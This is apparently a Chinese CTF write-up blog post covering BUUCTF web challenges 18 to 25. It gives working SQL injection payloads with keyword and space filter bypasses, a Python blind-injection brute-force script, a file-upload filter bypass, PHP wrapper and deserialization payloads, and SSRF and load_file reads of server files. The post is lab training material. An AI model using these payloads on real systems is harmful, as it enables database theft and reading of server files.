<h2 id="18、BabySQL"><a href="#18、BabySQL" class="headerlink" title="18、BabySQL"></a>18、BabySQL</h2><p><strong>这题其实是一样的套路，利用联合查询去沿着<code>information.schema</code> 爆字段，爆库，爆表，而其难度加大的一点在于题目增添了许多语句的过滤，这就需要我们根据回显去判断哪些地方被过滤了，因此，我只将该题涉及的过滤方法整理如下，其它步骤与LoveSQL那题完全一样</strong></p>
<p><strong>首先，这题对于标点符号没有过滤，可用<code>username: 1&#39; #  或 username:1&#39;;#</code>; <code>passwd: 1</code>来验证，没有语法错误</strong></p>
<p><strong>其次是关键字，尝试<code>username: 1&#39; or 1=1 #</code>,语法报错，在near后的语句，即为发生错误的地方后紧接的语句，那就是<code>OR</code>出了问题。把or换成<code>oorr</code>，发现可以成功绕过，于是可以推断它的规则应该都是这种过滤方式</strong></p>
<p><img src="https://s1.ax1x.com/2020/08/05/ayos0S.png" alt=""></p>
<p><strong>然后就是order by语句，order注意前面的or，发现还是报错了，说明by也有问题，改成<code>1&#39; oorder bbyy</code>即可通过</strong></p>
<p><strong>以此类推，在这道题中，<code>union =&gt; u[union]nion  ,select=&gt;se[select]elect  ,from=&gt;fr[from]om  ,where=&gt;wh[where]ere  ,information=&gt;infoorrmation  ,password=&gt;passwo[or]rd</code></strong></p>
<p><strong>按照这个思路即可拿到b4bsql表中的所有数据了，flag{3c272918-573c-4464-8e61-c46a011a13bd}</strong></p>
<h2 id="19、upload"><a href="#19、upload" class="headerlink" title="19、upload"></a>19、upload</h2><p><strong>源代码位于/var/www/html下的upload_file.php里</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;zh&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">    .error &#123;</span><br><span class="line">        font-family:Microsoft YaHei;</span><br><span class="line">        font-family:arial;</span><br><span class="line">        color:red;</span><br><span class="line">        font-size:40px;</span><br><span class="line">        text-align:center;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;check&lt;&#x2F;title&gt;</span><br><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;css&#x2F;reset.css&quot;&gt;</span><br><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;css&#x2F;demo.css&quot; &#x2F;&gt;</span><br><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;dist&#x2F;styles&#x2F;Vidage.css&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;Vidage&quot;&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;Vidage__image&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">        &lt;video id&#x3D;&quot;VidageVideo&quot; class&#x3D;&quot;Vidage__video&quot; preload&#x3D;&quot;metadata&quot; loop autoplay muted&gt;</span><br><span class="line">            &lt;source src&#x3D;&quot;videos&#x2F;bg.webm&quot; type&#x3D;&quot;video&#x2F;webm&quot;&gt;</span><br><span class="line">            &lt;source src&#x3D;&quot;videos&#x2F;bg.mp4&quot; type&#x3D;&quot;video&#x2F;mp4&quot;&gt;</span><br><span class="line">        &lt;&#x2F;video&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;Vidage__backdrop&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;script src&#x3D;&quot;dist&#x2F;scripts&#x2F;Vidage.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        new Vidage(&#39;#VidageVideo&#39;);</span><br><span class="line">    &lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;br&gt;&lt;&#x2F;br&gt;&lt;&#x2F;br&gt;&lt;&#x2F;br&gt;&lt;&#x2F;br&gt;&lt;&#x2F;br&gt;&lt;&#x2F;br&gt;&lt;&#x2F;br&gt;&lt;&#x2F;br&gt;&lt;&#x2F;br&gt;&lt;&#x2F;br&gt;&lt;&#x2F;br&gt;&lt;&#x2F;br&gt;&lt;&#x2F;br&gt;&lt;&#x2F;br&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;error&quot;&gt;</span><br><span class="line">&lt;strong&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$file &#x3D; $_FILES[&quot;file&quot;];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 不允许上传的图片后缀</span><br><span class="line">$allowedExts &#x3D; array(&quot;php&quot;,&quot;php2&quot;,&quot;php3&quot;,&quot;php4&quot;,&quot;php5&quot;,&quot;pht&quot;,&quot;phtm&quot;);</span><br><span class="line">$temp &#x3D; explode(&quot;.&quot;, $file[&quot;name&quot;]);</span><br><span class="line">$extension &#x3D; strtolower(end($temp));        &#x2F;&#x2F; 获取文件后缀名</span><br><span class="line">$image_type &#x3D; @exif_imagetype($file[&quot;tmp_name&quot;]);</span><br><span class="line">if ((($file[&quot;type&quot;] &#x3D;&#x3D; &quot;image&#x2F;gif&quot;)</span><br><span class="line">|| ($file[&quot;type&quot;] &#x3D;&#x3D; &quot;image&#x2F;jpeg&quot;)</span><br><span class="line">|| ($file[&quot;type&quot;] &#x3D;&#x3D; &quot;image&#x2F;jpg&quot;)</span><br><span class="line">|| ($file[&quot;type&quot;] &#x3D;&#x3D; &quot;image&#x2F;pjpeg&quot;)</span><br><span class="line">|| ($file[&quot;type&quot;] &#x3D;&#x3D; &quot;image&#x2F;x-png&quot;)</span><br><span class="line">|| ($file[&quot;type&quot;] &#x3D;&#x3D; &quot;image&#x2F;png&quot;))</span><br><span class="line">&amp;&amp;$file[&quot;size&quot;] &lt; 20480)    &#x2F;&#x2F; 小于 20 kb</span><br><span class="line">&#123;</span><br><span class="line">    if ($file[&quot;error&quot;] &gt; 0)&#123;</span><br><span class="line"></span><br><span class="line">        echo &quot;ERROR!!!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    elseif (in_array($extension, $allowedExts)) &#123;</span><br><span class="line">        echo &quot;NOT！&quot;.$extension.&quot;!&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">    elseif (mb_strpos(file_get_contents($file[&quot;tmp_name&quot;]), &quot;&lt;?&quot;) !&#x3D;&#x3D; FALSE) &#123;</span><br><span class="line">        echo &quot;NO! HACKER! your file included &#39;&amp;#x3C;&amp;#x3F;&#39;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    elseif (!$image_type) &#123;</span><br><span class="line">        echo &quot;Don&#39;t lie to me, it&#39;s not image at all!!!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $fileName&#x3D;&#39;.&#x2F;upload&#x2F;&#39;.$file[&#39;name&#39;];</span><br><span class="line">        move_uploaded_file($file[&#39;tmp_name&#39;],$fileName); </span><br><span class="line">        echo &quot;上传文件名: &quot; . $file[&quot;name&quot;] . &quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;Not image!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;strong&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;div style&#x3D;&quot;position: absolute;bottom: 0;width: 95%;&quot;&gt;&lt;p align&#x3D;&quot;center&quot; style&#x3D;&quot;font:italic 15px Georgia,serif;&quot;&gt; Syclover @ cl4y&lt;&#x2F;p&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p><strong>结合这个规则可以上传一个phtml文件。content-type改为图片，再加上GIF头，即可连接。url地址并没有给出来，可以猜测是在/upload/下，试了试果然是这样。</strong></p>
<h2 id="20、BackupFile"><a href="#20、BackupFile" class="headerlink" title="20、BackupFile"></a>20、BackupFile</h2><p><strong>这题很简单，首先题目提示了备份文件，自然想到index.php.bak，访问之后得到一个文件，里面是一串代码，大意就是：要提交一个key，使其转为整数后的值<code>弱</code>等于123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3，由于PHP的语法特性，123a==123，我们直接构造<code>?key=123</code>即可得到flag</strong></p>
<h2 id="21、hackworld"><a href="#21、hackworld" class="headerlink" title="21、hackworld"></a>21、hackworld</h2><p><strong>这题显然是一道SQL注入题。题目已经告诉了flag字段和flag表。经过测试发现应该是盲注。因为页面有这几种回显：</strong></p>
<p><strong>1、若是结果为1，则返回hello，gzlin…..；</strong></p>
<p><strong>2、若是结果为2，则返回do you want…..;</strong></p>
<p><strong>3、若是有错误，则返回bool(false)；</strong></p>
<p><strong>4、若是检测到敏感字符，则显示SQL inject…;</strong></p>
<p><strong>一开始就是想到的盲注的思路，构造<code>id=1 and xxxx</code>，发现编码依然通过不了检测，以为是自己还没掌握的绕过规则。后来看了wp，得知了一个思路，就是直接用盲注的结果作为id的值，即用if语句，语句为真为1，为假为2。通过这一点来进行盲注，不需要用到and，&amp;，即避免了被检测</strong></p>
<p><strong>一开始先测试flag的长度。开始用<code>if(length(select flag from flag)=10,1,2)</code>，发现被检测到注入，于是换成<code>if(length(select(flag)from(flag)=10,1,2)</code>绕过了检测，但是却显示bool（false）。想来用length应该测不了。于是换了个思路测长度，因为flag的最后一位必定是}，所以爆破哪一位是}即可。</strong></p>
<p><code>if(ascii(substr((select(flag)from(flag)),x,1))=125,1,2)</code></p>
<p><strong>爆破，得到flag有43位。然后就是测试每一位是什么了</strong></p>
<p><code>if(ascii(substr((select(flag)from(flag)),i,1))=j,1,2)</code></p>
<p><strong>因为循环比较多，所以写了个脚本</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;1e5e49c2-134b-4fd2-a3c3-7a80a706c094.node3.buuoj.cn&#x2F;index.php&quot;;</span><br><span class="line">flag&#x3D;&#39;&#39;</span><br><span class="line">if_end&#x3D;0</span><br><span class="line">for i in range(1,60):</span><br><span class="line">    if if_end&#x3D;&#x3D;1:</span><br><span class="line">        break</span><br><span class="line">    for j in range(32,128):</span><br><span class="line">        data1&#x3D;&#123;&#39;id&#39;:&#39;if(ascii(substr((select(flag)from(flag)),%d,1))&#x3D;%d,1,2)&#39;%(i,j),&#125;</span><br><span class="line">        r&#x3D;requests.post(url,data&#x3D;data1)</span><br><span class="line">        r.encoding &#x3D; r.apparent_encoding</span><br><span class="line">        if &#39;Hello&#39; in r.text :</span><br><span class="line">            flag+&#x3D;str(chr(j))</span><br><span class="line">            print(flag)</span><br><span class="line">        if &#39;&#125;&#39; in flag :       #经过测试，若给flag赋值‘空格’，用flag[-1]&#x3D;&#x3D;‘&#125;’判断的话，结果不对</span><br><span class="line">            print(flag)</span><br><span class="line">            if_end&#x3D;1</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>

<p><strong>等了大概六分钟出了结果</strong></p>
<h2 id="22、BuyFlag"><a href="#22、BuyFlag" class="headerlink" title="22、BuyFlag"></a>22、BuyFlag</h2><p><strong>首先查看源码，发现有一个pay.php，进去后再查看源码，发现一段注释，比较简单的PHP代码。就是让我们POST提交一个money和password，要让password值为404且不为纯数字，这是一个很简单的思路，但是，但是，这题我依然花了好久时间，有以下几点需要注意的地方：</strong></p>
<p><strong>首先，<code>password=404a &amp;money=100000000</code>，我是先用hackbar提交，但是没有反应，于是我换成burp，提交了很多次，都没有回显，有这几个原因：</strong></p>
<p><img src="https://s1.ax1x.com/2020/08/06/aRKtXD.png" alt=""></p>
<p><strong>第一，忘记把提交方式改成POST了！它的默认是GET!</strong></p>
<p><img src="https://s1.ax1x.com/2020/08/06/aRKHjU.png" alt=""></p>
<p><strong>第二，开始没将COOKIE中的user设为1，如果是0的话，它会显示你不是cuit的学生。</strong></p>
<p><strong>第三，在Raw 页面提交，会自动多一个参数导致不成功，最好是直接在Params页面提交。</strong></p>
<p><img src="https://s1.ax1x.com/2020/08/06/aRucw9.png" alt=""></p>
<p><strong>提交后，显示数字过长</strong></p>
<p><img src="https://s1.ax1x.com/2020/08/06/aRQno9.png" alt=""></p>
<p><strong>改成money=1e9即可。看了大佬的wp，据说这里使用strcmp进行对比，那么一种方法是用1e9减少长度，另一种使用<code>[]</code>去绕过这个函数，<code>money[]=xxx</code>即可</strong></p>
<p><img src="https://s1.ax1x.com/2020/08/06/aRQNod.png" alt=""></p>
<h2 id="23、nizhuansiwei"><a href="#23、nizhuansiwei" class="headerlink" title="23、nizhuansiwei"></a>23、nizhuansiwei</h2><p><img src="https://s1.ax1x.com/2020/08/23/d05j5F.png" alt=""></p>
<hr>
<p><strong>一共有三个变量。首先要让text的内容为welcome啥的，然后要写入文件后再读取，否则就没有任何回显。这里要先给text赋值，如果是单纯在url里赋值，是不起作用的，这里得用PHP伪协议的input。<code>?text=php://input</code>，同时POST提交welcome….zjctf，就达成了这个过程，然后页面出现回显，说明成功了。</strong></p>
<p><strong>再考虑file，后面提示file是useless.php，于是用php伪协议的filter读取useless文件内容，解码后得到一个类，用来执行后面的反序列化</strong></p>
<p><img src="https://s1.ax1x.com/2020/08/23/d07aMd.png" alt=""></p>
<p><strong>构造<code>?text=php://input&amp;file=useless.php&amp;password=O:4:%22Flag%22:1:{s:4:%22file%22;s:8:%22flag.php%22;}</code></strong></p>
<h2 id="24、EasyMD5"><a href="#24、EasyMD5" class="headerlink" title="24、EasyMD5"></a>24、EasyMD5</h2><h2 id="25、Fakebook"><a href="#25、Fakebook" class="headerlink" title="25、Fakebook"></a>25、Fakebook</h2><p>​    首先，进去是一个注册页面。所以先试着注册一下。</p>
<p>​    发现一个表，应该是四个字段，id，用户名，年龄，blog。</p>
<p>​    点进信息，发现url里有一个<code>view.php?no=1</code>判断这里可能有注入点。试了一下XSS,有回显。但是返回的错误显示有SQL错误，所以可能是存在SQL注入的漏洞，结合首页，应该是四个字段，所以在url里输入<code>0 union select 1,2,3,4</code>，发现被检测到注入。试了一下双写关键词，发现错误，所以不是过滤了关键词，那么可能就是空格的问题。关于空格，网上得知可以用<code>/**/</code>替代。于是开始注入。</p>
<p>​    <code>0/**/union/**/select/**/1,2,3,4   //发现注入点是2</code></p>
<p><code>0/**/union/**/select/**/1,group_concat(database()),3,4   //爆库，fakebook</code></p>
<p><code>0/**/union/**/select/**/1,group_concat(table_name),3,4/**/from/**/information_schema.tables/**/where/**/table_schema=&#39;fakebook&#39;   //爆表，users</code></p>
<p><code>0/**/union/**/select/**/1,group_concat(column_name),3,4/**/from/**/information_schema.columns/**/where/**/table_name=&#39;users&#39;   //爆字段，发现一个可用字段data</code></p>
<p><code>0/**/union/**/select/**/1,group_concat(data),3,4/**/from/**/users  //爆字段内容</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">得到</span><br><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:13:&quot;www.baidu.com&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>发现我们在注册时的内容生成了一个类的序列化。说明应该能找到泄露的源码去查看魔术方法的内容。</p>
<p>​    在robots.txt目录下发现user.php.bak，打开得到一段源码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line">    public $name &#x3D; &quot;&quot;;</span><br><span class="line">    public $age &#x3D; 0;</span><br><span class="line">    public $blog &#x3D; &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    public function __construct($name, $age, $blog)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name &#x3D; $name;</span><br><span class="line">        $this-&gt;age &#x3D; (int)$age;</span><br><span class="line">        $this-&gt;blog &#x3D; $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get($url)</span><br><span class="line">    &#x2F;&#x2F;这个函数的大意就是：模拟一个请求，访问你在blog输入的url，并返回内容。所以是可以用这个函数进行ssrf去访问目录下的文件，因为在下面的函数中过滤了用http:&#x2F;&#x2F;127.0.0.1&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php访问的途径，绕过而又要求用http协议去访问，所以可以采用file协议绕过，把它放在blog中，构造序列化字符串去访问。</span><br><span class="line">    &#123;</span><br><span class="line">        $ch &#x3D; curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">        $output &#x3D; curl_exec($ch);</span><br><span class="line">        $httpCode &#x3D; curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        if($httpCode &#x3D;&#x3D; 404) &#123;</span><br><span class="line">            return 404;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        return $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getBlogContents ()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($this-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function isValidBlog ()</span><br><span class="line">    &#123;</span><br><span class="line">        $blog &#x3D; $this-&gt;blog;</span><br><span class="line">        return preg_match(&quot;&#x2F;^(((http(s?))\:\&#x2F;\&#x2F;)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\&#x2F;\S*)?$&#x2F;i&quot;, $blog);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>看wp还看到一种解法，直接通过sql读取函数直接读取flag.php文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no&#x3D;100 union&#x2F;**&#x2F;select 1,load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&#39;),3,4 #</span><br></pre></td></tr></table></figure>


            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
                <source type="audio/mpeg" src="">
            </audio>
            
                <ul id="audio-list" style="display:none">
                    
                        
                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
                        
                    
                        
                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
                        
                    
                </ul>
            
        </div>
        
    <div id='gitalk-container' class="comment link"
		data-enable='true'
        data-ae='true'
        data-ci='2b954438d2f5ca9e36a0'
        data-cs='e36607cd1943678e41a7095a67641166a303ec4e'
        data-r='guoyanan1g.github.io'
        data-o='guoyanan1g'
        data-a='guoyanan1g'
        data-d='false'
    >查看评论</div>


    </div>
    
        <div class='side'>
			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1、HCTF2018-Warm-up"><span class="toc-number">1.</span> <span class="toc-text">1、HCTF2018 Warm up</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2、随便注"><span class="toc-number">2.</span> <span class="toc-text">2、随便注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3、EasySQL"><span class="toc-number">3.</span> <span class="toc-text">3、EasySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4、EasySQL-极客大挑战"><span class="toc-number">4.</span> <span class="toc-text">4、EasySQL(极客大挑战)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5、Easy-tornado"><span class="toc-number">5.</span> <span class="toc-text">5、Easy_tornado</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6、Havefun"><span class="toc-number">6.</span> <span class="toc-text">6、Havefun</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7、Easy-Calc"><span class="toc-number">7.</span> <span class="toc-text">7、Easy_Calc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8、Secret-File"><span class="toc-number">8.</span> <span class="toc-text">8、Secret File</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9、LoveSQL"><span class="toc-number">9.</span> <span class="toc-text">9、LoveSQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10、admin"><span class="toc-number">10.</span> <span class="toc-text">10、admin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11、Inlcude"><span class="toc-number">11.</span> <span class="toc-text">11、Inlcude</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12、Ping-Ping-Ping"><span class="toc-number">12.</span> <span class="toc-text">12、Ping Ping Ping</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#13、PHP"><span class="toc-number">13.</span> <span class="toc-text">13、PHP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#14、Knife"><span class="toc-number">14.</span> <span class="toc-text">14、Knife</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#15、HTTP"><span class="toc-number">15.</span> <span class="toc-text">15、HTTP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#16、Exec"><span class="toc-number">16.</span> <span class="toc-text">16、Exec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#17、CheckIn"><span class="toc-number">17.</span> <span class="toc-text">17、CheckIn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#18、BabySQL"><span class="toc-number">18.</span> <span class="toc-text">18、BabySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#19、upload"><span class="toc-number">19.</span> <span class="toc-text">19、upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#20、BackupFile"><span class="toc-number">20.</span> <span class="toc-text">20、BackupFile</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#21、hackworld"><span class="toc-number">21.</span> <span class="toc-text">21、hackworld</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#22、BuyFlag"><span class="toc-number">22.</span> <span class="toc-text">22、BuyFlag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#23、nizhuansiwei"><span class="toc-number">23.</span> <span class="toc-text">23、nizhuansiwei</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#24、EasyMD5"><span class="toc-number">24.</span> <span class="toc-text">24、EasyMD5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#25、Fakebook"><span class="toc-number">25.</span> <span class="toc-text">25、Fakebook</span></a></li></ol>	
        </div>
    
</div>


    </div>
</div>
</body>

<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>


<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
<script src="/js/plugin.js"></script>
<script src="/js/typed.js"></script>
<script src="/js/diaspora.js"></script>


<link rel="stylesheet" href="/photoswipe/photoswipe.css">
<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">


<script src="/photoswipe/photoswipe.min.js"></script>
<script src="/photoswipe/photoswipe-ui-default.min.js"></script>


<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>
    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">
        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>
        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <!--  Controls are self-explanatory. Order can be changed. -->
                <div class="pswp__counter"></div>
                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>
            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>
            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>
            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>






</html>
